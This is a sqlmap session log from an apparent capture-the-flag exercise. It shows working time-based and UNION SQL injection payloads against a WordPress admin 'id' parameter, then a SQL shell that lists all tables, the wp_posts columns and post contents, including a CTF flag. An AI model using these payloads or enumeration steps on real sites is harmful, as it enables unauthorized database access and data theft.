@@ -1,0 +1,215 @@
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.2.1.25#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 06:46:15
+
+[06:46:16] [INFO] testing connection to the target URL
+[06:46:17] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[06:46:17] [WARNING] reflective value(s) found and filtering out
+[06:46:18] [INFO] testing if the target URL content is stable
+[06:46:19] [WARNING] target URL content is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[06:46:24] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[06:46:25] [INFO] testing for SQL injection on GET parameter 'id'
+[06:46:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[06:46:43] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
+[06:46:46] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[06:46:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[06:46:57] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[06:47:02] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[06:47:08] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[06:47:09] [INFO] testing 'MySQL inline queries'
+[06:47:10] [INFO] testing 'PostgreSQL inline queries'
+[06:47:11] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[06:47:12] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[06:47:16] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[06:47:20] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[06:47:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[06:47:38] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n
+[06:47:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[06:47:55] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[06:48:16] [INFO] target URL appears to be UNION injectable with 11 columns
+[06:48:38] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 114 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: page=el_admin_main&action=edit&id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: page=el_admin_main&action=edit&id=-2667 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7178767a71,0x61476b585069424c48467a736d476c6b716f5743427a634151536170544c546d57436e4348634170,0x7162717671),NULL,NULL,NULL,NULL-- oarH
+---
+[06:48:43] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[06:48:43] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
+sql-shell> select table_name from information_schema.tables where table_schema != 'information_schema'
+[06:50:05] [INFO] fetching SQL SELECT statement query output: 'select table_name from information_schema.tables where table_schema != 'information_schema''
+[06:50:06] [INFO] used SQL query returns 36 entries
+[06:50:06] [INFO] starting 10 threads
+[06:50:07] [INFO] retrieved: wp_app_user_info
+[06:50:07] [INFO] retrieved: wp_bwg_album_gallery
+[06:50:07] [INFO] retrieved: wp_bwg_album
+[06:50:08] [INFO] retrieved: wp_bwg_image_comment
+[06:50:08] [INFO] retrieved: wp_bwg_image_rate
+[06:50:08] [INFO] retrieved: wp_bwg_image_tag
+[06:50:08] [INFO] retrieved: wp_bwg_image
+[06:50:08] [INFO] retrieved: wp_bwg_theme
+[06:50:08] [INFO] retrieved: wp_bwg_gallery
+[06:50:08] [INFO] retrieved: wp_bwg_shortcode
+[06:50:09] [INFO] retrieved: wp_commentmeta
+[06:50:09] [INFO] retrieved: wp_comments
+[06:50:09] [INFO] retrieved: wp_event_list
+[06:50:09] [INFO] retrieved: wp_spidercalendar_event_category
+[06:50:09] [INFO] retrieved: wp_spidercalendar_calendar
+[06:50:10] [INFO] retrieved: wp_links
+[06:50:10] [INFO] retrieved: wp_postmeta
+[06:50:10] [INFO] retrieved: wp_options
+[06:50:10] [INFO] retrieved: wp_spidercalendar_event
+[06:50:10] [INFO] retrieved: wp_posts
+[06:50:10] [INFO] retrieved: wp_spidercalendar_theme
+[06:50:10] [INFO] retrieved: wp_spidercalendar_widget_theme
+[06:50:10] [INFO] retrieved: wp_statistics_exclusions
+[06:50:10] [INFO] retrieved: wp_statistics_historical
+[06:50:11] [INFO] retrieved: wp_statistics_search
+[06:50:11] [INFO] retrieved: wp_statistics_pages
+[06:50:11] [INFO] retrieved: wp_statistics_visit
+[06:50:11] [INFO] retrieved: wp_statistics_visitor
+[06:50:11] [INFO] retrieved: wp_term_relationships
+[06:50:11] [INFO] retrieved: wp_statistics_useronline
+[06:50:11] [INFO] retrieved: wp_term_taxonomy
+[06:50:11] [INFO] retrieved: wp_termmeta
+[06:50:11] [INFO] retrieved: wp_terms
+[06:50:12] [INFO] retrieved: wp_user_profile_follow
+[06:50:12] [INFO] retrieved: wp_usermeta
+[06:50:12] [INFO] retrieved: wp_users
+select table_name from information_schema.tables where table_schema != 'information_schema' [36]:
+[*] wp_app_user_info
+[*] wp_bwg_album
+[*] wp_bwg_album_gallery
+[*] wp_bwg_gallery
+[*] wp_bwg_image
+[*] wp_bwg_image_comment
+[*] wp_bwg_image_rate
+[*] wp_bwg_image_tag
+[*] wp_bwg_shortcode
+[*] wp_bwg_theme
+[*] wp_commentmeta
+[*] wp_comments
+[*] wp_event_list
+[*] wp_links
+[*] wp_options
+[*] wp_postmeta
+[*] wp_posts
+[*] wp_spidercalendar_calendar
+[*] wp_spidercalendar_event
+[*] wp_spidercalendar_event_category
+[*] wp_spidercalendar_theme
+[*] wp_spidercalendar_widget_theme
+[*] wp_statistics_exclusions
+[*] wp_statistics_historical
+[*] wp_statistics_pages
+[*] wp_statistics_search
+[*] wp_statistics_useronline
+[*] wp_statistics_visit
+[*] wp_statistics_visitor
+[*] wp_term_relationships
+[*] wp_term_taxonomy
+[*] wp_termmeta
+[*] wp_terms
+[*] wp_user_profile_follow
+[*] wp_usermeta
+[*] wp_users
+
+sql-shell> select column_name from information_schema.columns where table_name = 'wp_posts'
+[06:51:16] [INFO] fetching SQL SELECT statement query output: 'select column_name from information_schema.columns where table_name = 'wp_posts''
+[06:51:17] [INFO] used SQL query returns 23 entries
+[06:51:17] [INFO] starting 10 threads
+[06:51:18] [INFO] retrieved: post_author
+[06:51:18] [INFO] retrieved: post_date
+[06:51:18] [INFO] retrieved: ID
+[06:51:19] [INFO] retrieved: post_content
+[06:51:19] [INFO] retrieved: post_status
+[06:51:19] [INFO] retrieved: ping_status
+[06:51:19] [INFO] retrieved: post_title
+[06:51:19] [INFO] retrieved: post_excerpt
+[06:51:19] [INFO] retrieved: post_date_gmt
+[06:51:19] [INFO] retrieved: comment_status
+[06:51:20] [INFO] retrieved: post_password
+[06:51:20] [INFO] retrieved: post_name
+[06:51:20] [INFO] retrieved: pinged
+[06:51:20] [INFO] retrieved: to_ping
+[06:51:20] [INFO] retrieved: post_modified_gmt
+[06:51:20] [INFO] retrieved: post_parent
+[06:51:20] [INFO] retrieved: post_modified
+[06:51:20] [INFO] retrieved: menu_order
+[06:51:20] [INFO] retrieved: guid
+[06:51:20] [INFO] retrieved: post_content_filtered
+[06:51:21] [INFO] retrieved: post_type
+[06:51:21] [INFO] retrieved: comment_count
+[06:51:21] [INFO] retrieved: post_mime_type
+select column_name from information_schema.columns where table_name = 'wp_posts' [23]:
+[*] comment_count
+[*] comment_status
+[*] guid
+[*] ID
+[*] menu_order
+[*] ping_status
+[*] pinged
+[*] post_author
+[*] post_content
+[*] post_content_filtered
+[*] post_date
+[*] post_date_gmt
+[*] post_excerpt
+[*] post_mime_type
+[*] post_modified
+[*] post_modified_gmt
+[*] post_name
+[*] post_parent
+[*] post_password
+[*] post_status
+[*] post_title
+[*] post_type
+[*] to_ping
+
+sql-shell> select post_content from wp_posts
+[06:51:32] [INFO] fetching SQL SELECT statement query output: 'select post_content from wp_posts'
+[06:51:34] [INFO] used SQL query returns 13 entries
+[06:51:34] [INFO] starting 10 threads
+[06:51:35] [INFO] retrieved:
+[06:51:35] [INFO] retrieved:
+[06:51:35] [INFO] retrieved: Those <span class=&quot;link"><a href="https://www.cnet.com/news/spectre-meltdown-intel-arm-amd-processor-cpu-chip-flaw-vulnerability-faq/">major chip security flaws</a></span>, <span class="link"><a href=...
+[06:51:35] [INFO] retrieved:
+[06:51:35] [INFO] retrieved: The Senior Incident Response Consultant will work within established methodologies to perform a variety of Incident Response related activities for Cisco customers, to include responding to cyber incidents...
+[06:51:35] [INFO] retrieved:
+[06:51:35] [INFO] retrieved: <span class=&quot;main-article-info">Security researchers have discovered several severe vulnerabilities and a secret hard-coded backdoor in Western Digital's My Cloud NAS devices that could allow remote a...
+[06:51:35] [INFO] retrieved: Flag is SharifCTF{e7134abea7438e937b87608eab0d979c}
+[06:51:35] [INFO] retrieved:
+[06:51:35] [INFO] retrieved: <strong>Researchers at Proofpoint discovered recently that Google Apps Script could have been abused by malicious hackers to automatically download malware hosted on Google Drive to targeted devices.</stro...
+[06:51:36] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurrences will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.
+[06:51:36] [INFO] retrieved:  [shortcode atts_1=?test? atts_2=?test?]
+[06:51:36] [INFO] retrieved:
+[06:51:36] [INFO] retrieved:
+select post_content from wp_posts [6]:
+[*]  [shortcode atts_1=?test? atts_2=?test?]
+[*] <span class=&quot;main-article-info">Security researchers have discovered several severe vulnerabilities and a secret hard-coded backdoor in Western Digital's My Cloud NAS devices that could allow remote attackers to gain unrestricted root access to the device.\r\n\r\nWestern Digital's My Cloud (WDMyCloud) is one of the most popular network-attached storage devices which is being used by individuals and businesses to host their files, and automatically backup and sync them with various cloud and web-based services.\r\n\r\nThe device lets users not only share files in a home network, but the private cloud feature also allows them to access their data from anywhere at any time.<img class="alignnone size-full wp-image-13" src="http://10.0.3.189/wp-content/uploads/2018/01/81XdO46fI7L._SL1500_.jpg" alt="" width="1500" height="1500" /></span>
+[*] <strong>Researchers at Proofpoint discovered recently that Google Apps Script could have been abused by malicious hackers to automatically download malware hosted on Google Drive to targeted devices.</strong>\r\n\r\nGoogle Apps Script is a JavaScript-based scripting language that allows developers to build web applications and automate tasks. Experts noticed that the service could have been leveraged to deliver malware by using simple triggers, such as onOpen or onEdit.\r\n\r\nIn an <a href=&quot;https://www.proofpoint.com/us/corporate-blog/post/new-google-apps-script-vulnerability-extends-url-based-threats-saas-platforms" target="_blank" rel="noopener">attack scenario described by Proofpoint</a>, attackers uploaded a piece of malware to Google Drive and created a public link to it. They then used Google Docs to send the link to the targeted users. Once victims attempted to edit the Google Docs file, the Apps Script triggers would cause the malware to be automatically downloaded to their devices. Researchers said attackers could have used social engineering to convince the target to execute the malware.\r\n\r\nGoogle has implemented new restrictions for simple triggers in an effort to block malware and phishing attacks triggered by opening a document.\r\n\r\nWhile there is no evidence that this method has been exploited in the wild, malicious actors abusing Google Apps Script is not unheard of. A cybercrime group using the infamous Carbanak malware at one point <a href="http://www.securityweek.com/carbanak-hackers-use-google-command-and-control" target="_blank" rel="noopener">leveraged the service</a> for command and control (C&C) communications.\r\n\r\n?SaaS platforms remain a ?Wild West? for threat actors and defenders alike. New tools like Google Apps Script are rapidly adding functionality while threat actors look for novel ways of abusing these platforms. At the same time, few tools exist that can detect threats generated by or distributed via legitimate software-as-a-service (SaaS) platforms,? explained Maor Bin, security research lead of Threat Systems Products at Proofpoint.\r\n\r\n?This creates considerable opportunities for threat actors who can leverage newfound vulnerabilities or use ?good for bad?: making use of legitimate features for malicious purposes,? he added.\r\n\r\nA few months ago, Google announced the introduction of <a href="http://www.securityweek.com/google-warns-users-potentially-risky-web-apps" target="_blank" rel="noopener">new warnings</a> for potentially risky web apps and Apps Scripts.
+[*] Flag is SharifCTF{e7134abea7438e937b87608eab0d979c}
+[*] The Senior Incident Response Consultant will work within established methodologies to perform a variety of Incident Response related activities for Cisco customers, to include responding to cyber incidents, proactively hunting for adversaries in customer networks, designing and performing Table Top Exercises, and performing IR Readiness Assessments.
+[*] Those <span class=&quot;link"><a href="https://www.cnet.com/news/spectre-meltdown-intel-arm-amd-processor-cpu-chip-flaw-vulnerability-faq/">major chip security flaws</a></span>, <span class="link"><a href="https://www.cnet.com/news/chips-exploit-meltdown-spectre-security-flaws-afflict-arm-phones-and-intel-pcs/">detailed Wednesday</a></span>, impact all Macs and <a href="https://www.cnet.com/tags/ios-11/" data-annotation="true" data-component="linkTracker" data-link-tracker-options="{"action":"inline-annotation|Apple iOS 11|CNET_TAG|483"}">iOS</a> devices. But <a href="https://www.cnet.com/apple/" data-annotation="true" data-component="linkTracker" data-link-tracker-options="{"action":"inline-annotation|Apple|CNET_COLL|579"}">Apple</a> said downloading its latest software updates fixes one of the vulnerabilities.\r\n\r\nApple on Thursday said all of its computers, <a href="https://www.cnet.com/products/apple-iphone-x/review/" data-annotation="true" data-component="linkTracker" data-link-tracker-options="{"action":"inline-annotation|Apple iPhone X|CNET_FAM_SERIES|558"}">iPhones</a> and <a href="https://www.cnet.com/products/apple-ipad-2017-9-7-inch/review/" data-annotation="true" data-component="linkTracker" data-link-tracker-options="{"action":"inline-annotation|Apple iPad 2017 (9.7-inch)|CNET_FAM_SERIES|285"}">iPads</a> are affected by the two newly discovered flaws, dubbed <a href="https://meltdownattack.com/meltdown.pdf" target="_blank" rel="noopener" data-component="externalLink">Meltdown</a> and <a href="https://spectreattack.com/spectre.pdf" target="_blank" rel="noopener" data-component="externalLink">Spectre</a>. It said at that time that the <a href="https://www.cnet.com/products/apple-watch-series-3/review/" data-annotation="true" data-component="linkTracker" data-link-tracker-options="{"action":"inline-annotation|Apple Watch Series 3|CNET_FAM_SERIES|150"}">Apple Watch</a> isn't impacted by Meltdown, and on Friday added that the smartwatch isn't affected by Spectre, either. Apple TVs, meanwhile, are affected.\r\n\r\nThe company didn't immediately give additional information about which <a href="https://www.cnet.com/products/apple-tv-4k/review/" data-annotation="true" data-component="linkTracker" data-link-tracker-options="{"action":"inline-annotation|Apple TV 4K|CNET_FAM_SERIES|225"}">Apple TV</a> models are impacted.\r\n\r\nApple said, though, that "there are no known exploits impacting customers at this time" and that for a hacker to exploit the flaws, there would also have to be a malicious app loaded on a Mac or iOS device. Apple recommended only downloading software from trusted locations like its App Store to avoid software with malware.\r\n<div class="shortcode related-links float_left">\r\n<h3>For more on the chip flaws</h3>\r\n<ul>\r\n \t<li><a href="https://www.cnet.com/news/chips-exploit-meltdown-spectre-security-flaws-afflict-arm-phones-and-intel-pcs/">Major Intel, Arm chip security flaw puts your PCs, phones at risk</a></li>\r\n \t<li><a href="https://www.cnet.com/news/spectre-meltdown-intel-arm-amd-processor-cpu-chip-flaw-vulnerability-faq/">Spectre and Meltdown: Details you need on those big chip flaws</a></li>\r\n \t<li><a href="https://www.cnet.com/news/most-intel-pcs-immune-to-spectre-meltdown-next-week/">Most Intel PCs 'immune' to Spectre, Meltdown by next week</a></li>\r\n \t<li><a href="https://www.cnet.com/how-to/how-to-fix-meltdown-spectre-intel-amd-arm-windows-mac-android-ios/">How to protect yourself from Meltdown and Spectre CPU flaws</a></li>\r\n</ul>\r\n</div>\r\n<div id="inpage-video-top-5a51dc3534bc5" class="ad-inpage-video-top" data-ad="inpage-video-top"></div>\r\nApple said iOS 11.2, <a href="https://www.cnet.com/tags/macos-high-sierra/" data-annotation="true" data-component="linkTracker" data-link-tracker-options="{"action":"inline-annotation|Apple macOS High Sierra|CNET_TAG|285"}">MacOS</a> 10.13.2 and TVOS 11.2 already defend against the Meltdown flaw. It plans to release fixes for its Safari browser over the coming days to help defend against the Spectre flaw.\r\n\r\n"We continue to develop and test further mitigations for these issues and will release them in upcoming updates of iOS, MacOS, tvOS and watchOS," Apple said on a<a href="https://support.apple.com/en-us/HT208394" target="_blank" rel="noopener" data-component="externalLink"> support page</a>.\r\n\r\nOn Tuesday, news broke that a newly discovered exploit in most modern <a href="https://www.cnet.com/tags/processors/" data-annotation="true" data-component="linkTracker" data-link-tracker-options="{"action":"inline-annotation|Processors|CNET_TAG|502"}">processors</a> could make your computer or phone vulnerable to attacks. Then on Wednesday, <a href="https://www.cnet.com/tags/intel/" data-annotation="true" data-component="linkTracker" data-link-tracker-options="{"action":"inline-annotation|Intel|CNET_TAG|1300"}">Intel</a>, Arm and others <span class="link"><a href="https://www.cnet.com/news/chips-exploit-meltdown-spectre-security-flaws-afflict-arm-phones-and-intel-pcs/">acknowledged their processors are affected by the flaws</a></span>.\r\n\r\nIntel supplies chips for most of the world's computers, including Apple's Macs. And Arm's architecture is built into nearly every mobile processor, including chips designed by Apple for the iPhone and iPad.\r\n\r\nSeveral researchers, including a member of <a href="https://googleprojectzero.blogspot.co.uk/2018/01/reading-privileged-memory-with-side.html" target="_blank" rel="noopener" data-component="externalLink">Google's Project Zero</a> team, found that a design technique used in chips from Intel, Arm and others could allow hackers to access private data from the memory on your device that it shouldn't be able to see. The problem impacts processors going back more than two decades and could let hackers access passwords, encryption keys or sensitive information open in applications.\r\n\r\nThe flaws aren't unique to one particular chipmaker or device. Instead, they impact everything from <a href="https://www.cnet.com/topics/phones/" data-annotation="true" data-component="linkTracker" data-link-tracker-options="{"action":"inline-annotation|Phones|CNET_CAT_TOPIC|483"}">phones</a> to PCs and servers. The <span class="link"><a href="https://www.cnet.com/news/how-to-fix-meltdown-spectre-intel-amd-arm-windows-mac-android-ios/">computing industry is scrambling to lessen the severity of the problem</a></span> with updates to <a href="https://www.cnet.com/topics/operating-systems/" data-annotation="true" data-component="linkTracker" data-link-tracker-options="{"action":"inline-annotation|Operating Systems|CNET_CAT_TOPIC|390"}">operating systems</a>, web browsers, cloud-computing services and other foundations that need to be kept secure.\r\n\r\nIntel on Thursday said that by the end of next week, it expects to have issued <span class="link"><a href="https://www.cnet.com/news/most-intel-pcs-immune-to-spectre-meltdown-next-week/">updates for more than 90 percent of its processors</a></span> introduced within the past five years. The updates make computers "immune from both exploits," Intel said.\r\n\r\nFirst published Jan. 4 at 4:33 a.m. PT.\r\n<strong>Update Jan. 4 at 4:45 p.m. PT: </strong>Added background information.\r\n<strong>Update Jan. 5 at 12:07 p.m. PT:</strong> Added that neither Spectre nor Meltdown affects the Apple Watch.
+
+sql-shell> q
+[06:51:55] [INFO] fetched data logged to text files under 'C:\Users\Vova\.sqlmap\output\8082.ctf.certcc.ir'
+
+[*] shutting down at 06:51:55
